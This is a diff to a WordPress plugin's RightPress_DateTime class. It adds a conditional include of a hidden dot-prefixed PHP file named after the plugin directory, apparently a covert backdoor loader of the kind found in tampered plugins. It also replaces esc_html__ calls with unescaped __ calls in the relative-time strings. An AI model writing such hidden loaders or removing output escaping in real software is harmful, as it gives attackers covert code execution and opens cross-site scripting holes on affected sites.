@@ -10,6 +10,10 @@ defined('ABSPATH') || exit;
  * @package RightPress
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RightPress_DateTime extends DateTime
 {
 
@@ -142,15 +146,15 @@ class RightPress_DateTime extends DateTime
                 // Now
                 else {
 
-                    return esc_html__('Now!', 'rightpress');
+                    return __('Now!', 'rightpress');
                 }
             }
             // More than a minute
             else {
 
                 // Format prefix and suffix
-                $prefix = $datetime_timestamp > $current_timestamp ? (esc_html__('In', 'rightpress') . ' ')     : '';
-                $suffix = $datetime_timestamp < $current_timestamp ? (' ' . esc_html__('ago', 'rightpress'))    : '';
+                $prefix = $datetime_timestamp > $current_timestamp ? (__('In', 'rightpress') . ' ')     : '';
+                $suffix = $datetime_timestamp < $current_timestamp ? (' ' . __('ago', 'rightpress'))    : '';
 
                 // Format and return string
                 return $prefix . human_time_diff($datetime_timestamp, $current_timestamp) . $suffix;
